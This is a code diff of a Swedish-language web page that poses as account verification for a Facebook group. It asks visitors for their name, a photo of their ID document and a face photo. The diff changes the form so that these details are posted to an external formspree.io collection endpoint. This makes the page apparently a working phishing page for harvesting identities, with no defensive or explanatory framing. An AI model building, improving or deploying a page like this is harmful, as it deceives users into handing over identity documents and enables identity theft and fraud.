@@ -37,10 +37,12 @@ input[type=submit]:hover {
 </head>
 <body>
 
+
+
 <h3>Konto verifiering för Facebookgrupp</h3>
 
 <div class="container">
-  <form action="/action_page.php">
+  <form action="https://formspree.io/f/mknpyekw" method="POST">
     <label for="fname">Förnamn</label>
     <input type="text" id="fname" name="firstname" placeholder="Ditt namn..">
 
@@ -60,7 +62,7 @@ input[type=submit]:hover {
 
 
     <h3>Ladda upp en bild på framsidan av din IDhandling</h3>
-
+<label>
 <input type="file" id="myFile">
 
 <button onclick="myFunction()">Ladda upp</button>
@@ -71,6 +73,7 @@ function myFunction() {
   x.disabled = true;
 }
 </script>
+</label>
 <br><br>
 
 <h3>Ansiktsverifiering</h3>
@@ -78,6 +81,7 @@ function myFunction() {
 <p>Tänk på att ansiktet ska vara tydligt.</p>
 <img src="picturever.png"> <br><br>
 
+<label>
 <input type="file" id="myFile">
 
 <button onclick="myFunction()">Ladda upp</button>
@@ -88,6 +92,7 @@ function myFunction() {
   x.disabled = true;
 }
 </script>
+</label>
 <br><br>
 
 
